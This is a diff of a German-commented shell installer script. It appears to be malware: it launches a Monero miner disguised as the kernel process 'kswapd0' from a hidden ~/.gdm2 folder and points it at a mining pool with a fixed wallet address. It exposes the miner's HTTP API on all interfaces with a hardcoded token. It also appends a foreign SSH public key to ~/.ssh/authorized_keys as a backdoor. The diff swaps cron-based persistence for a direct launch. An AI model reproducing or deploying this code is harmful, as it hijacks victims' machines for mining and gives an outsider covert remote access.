@@ -360,19 +360,21 @@ fi
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/'t $HOME/.gdm2/config.json
 
 # Cronjob erstellen
- (crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
+# (crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
 
 # Skript für den Cronjob erstellen
-cat << 'EOF' > "$HOME/.gdm2/check_and_start.sh"
+#cat << 'EOF' > "$HOME/.gdm2/check_and_start.sh"
  
-#!/bin/bash
-if ! pgrep -f "kswapd0"; then
-  $HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
-fi
-EOF
+##!/bin/bash
+#if ! pgrep -f "kswapd0"; then
+#  $HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+#fi
+#EOF
 
  # Skript ausführbar machen
- chmod +x $HOME/.gdm2/check_and_start.sh
+# chmod +x $HOME/.gdm2/check_and_start.sh
+
+$HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 
 echo "[*] Generating ssh key on server"
 
@@ -383,7 +385,5 @@ chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
-
-$HOME/.gdm2/kswapd0 --config $HOME/.gdm2/config_background.json
 
 echo "[*] Setup complete"
